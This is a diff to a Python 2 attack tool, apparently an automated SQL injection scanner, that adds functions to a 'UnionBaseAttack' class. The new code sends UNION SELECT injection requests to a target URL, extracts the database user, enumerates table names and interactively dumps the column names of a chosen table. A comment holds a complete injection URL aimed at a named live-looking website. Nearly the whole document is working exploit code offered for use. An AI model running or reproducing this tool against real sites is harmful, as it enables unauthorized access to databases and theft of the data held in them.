@@ -8,6 +8,7 @@ try:
     import requests as reqs
     import sys
     import string as string
+    import src.libs as lib
     import re
     from time import sleep
     from Config.WebConfig import (define_headerdata)
@@ -59,6 +60,7 @@ class UnionBaseAttack(object):
         def extract_number_of_vulnarable_columns(injection_tuple,columns):
             vuln_columns = list()
             raw_vuln_columns = list()
+            done_searching_columns = False
             list_injection_numbers = list_injection_number(columns)
             for item in define_union_select_query_php:
                 response = reqs.get(url=injection_tuple[0] + str(item + injection_tuple[1]),
@@ -107,12 +109,104 @@ class UnionBaseAttack(object):
                 sleep(.5)
             sleep(.5)
 
+        def extract_user(tuple_var):
+            for item in define_user_detection_query_php:
+                response = reqs.get(str(string.replace(tuple_var[1], tuple_var[0][0], item)),
+                                    headers=define_headerdata, verify=False)
+                if response.content.find("'2134115356'") is not -1:
+                    end = re.search("'2134115356'", response.content).end()
+                    starts = re.search("'62134115356'", response.content).start()
+                    print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:starts] + TextColor.WHITE
+                sleep(.5)
+            sleep(.5)
 
-        #start from here
+        def exploit(tuple_var):
+            table_name = list()
+            limit_counter = 0
+            counter = 0
+            print TextColor.ENDC + "Please wait to get all table name ..."
+            while True:
+                response = reqs.get(str(string.replace(tuple_var[1],
+                            tuple_var[0][0], define_get_tables_name_query_php[counter])
+                            + define_end_query_of_tables_name_php[counter] + "%d, 1"%(limit_counter)),
+                                            headers=define_headerdata, verify=False)
+                if response.content.find("'2134115356'") is not -1:
+                    try:
+                        end = re.search("'2134115356'", response.content).end()
+                        start = re.search("'62134115356'", response.content).start()
+                        table_name.append(response.content[end:start])
+                        limit_counter += 1
+                    except:
+                        break
+                else:
+                    break
+                sleep(.5)
+
+            counter = 0
+            make_table = lib.mytable(['Count', 'Name'])
+            for item in table_name:
+                make_table.add_row([str(counter), item])
+                counter += 1
+
+            print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
+
+            while True:
+                table_num = raw_input(TextColor.CBLUE + "~#/Enter table that you want extract([enter exit to return]):" + TextColor.WHITE)
+                if table_num == "exit":
+                    break
+                print
+
+                selected_table = table_name[int(table_num)]
+                #extract column in table_name with convert query
+                column_extracted = list()
+                limit_counter = 0
+                counter = 0
+                print TextColor.ENDC + "Please wait to get all column name in table %s ..." % (selected_table)
+                while True:
+                    #http://www.jazzjournal.co.uk/article.php?id=-20%20UnIon%20SeLeCt%201111111111,%20CoNcaT(QUOTE(2134115356),%20ConVert(ColumN_NAME+UsIng+LAtin1),%20QUOTE(62134115356)),3333333333,4444444444,5555555555,6666666666,7777777777,8888888888,9999999999,10101010101010101010,11111111111111111111,12121212121212121212%20FROm%20iNforMation_sCheMa.COLUmns%20wHeRe%20tAblE_NamE=0x637573746f6d657273%20limit%200,%201%20%23
+                    response = reqs.get(str(string.replace(tuple_var[1],
+                                                           tuple_var[0][0], define_get_columns_of_table_query_php[counter])
+                                                    + define_end_string_columns_of_table_query_php[counter] + "" + selected_table + ""
+                                                    + " limit %d, 1" % (limit_counter) + "%23"), headers=define_headerdata, verify=False)
+                    print response
+
+                    #todo= I must clean this section and change our main payload
+
+                    # print str(string.replace(tuple_var[1],
+                    #         tuple_var[0][0], define_get_columns_of_table_query_php[counter])
+                    #         + define_end_string_columns_of_table_query_php[counter] + "" + selected_table + ""
+                    #             + " limit %d, 1" % (limit_counter))
+
+                    if response.content.find("'2134115356'") is not -1:
+                        try:
+                            end = re.search("'2134115356'", response.content).end()
+                            start = re.search("'62134115356'", response.content).start()
+                            column_extracted.append(response.content[end:start])
+                            limit_counter = limit_counter + 1
+                        except:
+                            break
+                    else:
+                        break
+
+                    lib.sleep(.5)
+
+                print
+
+                counter = 0
+                make_table = lib.mytable(['Count', 'Name'])
+                for item in column_extracted:
+                    make_table.add_row([str(counter), item])
+                    counter = counter + 1
+                print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
+
+                #start from here
         injection_string_tuple = create_url(columns)
         tuple_of_injectionString_and_vulnColumns = extract_number_of_vulnarable_columns(injection_string_tuple, columns)
         extract_database_name(tuple_of_injectionString_and_vulnColumns)
         extract_version(tuple_of_injectionString_and_vulnColumns)
+        extract_user(tuple_of_injectionString_and_vulnColumns)
+        exploit(tuple_of_injectionString_and_vulnColumns)
+
 
 
     def __order_by_cmd__(self):
